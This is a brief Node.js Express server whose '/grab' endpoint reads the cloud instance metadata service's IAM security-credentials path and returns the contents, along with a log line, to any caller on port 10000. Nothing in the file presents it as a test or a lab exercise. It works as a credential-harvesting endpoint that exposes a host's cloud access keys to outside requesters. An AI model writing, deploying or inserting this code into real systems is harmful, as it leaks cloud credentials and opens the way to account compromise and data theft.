const express = require('express');
const fetch = require('node-fetch');
const app = express();

app.get('/grab', async (req, res) => {
  const sensitiveUrl = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';
  try {
    const response = await fetch(sensitiveUrl, { timeout: 2000 });
    const text = await response.text();
    console.log("Metadata:", text);
    res.send(`<pre>${text}</pre>`);
  } catch (err) {
    console.log("Error:", err.message);
    res.status(500).send("Failed to fetch metadata");
  }
});

app.listen(10000, () => {
  console.log('🔥 Server running on port 10000');
});
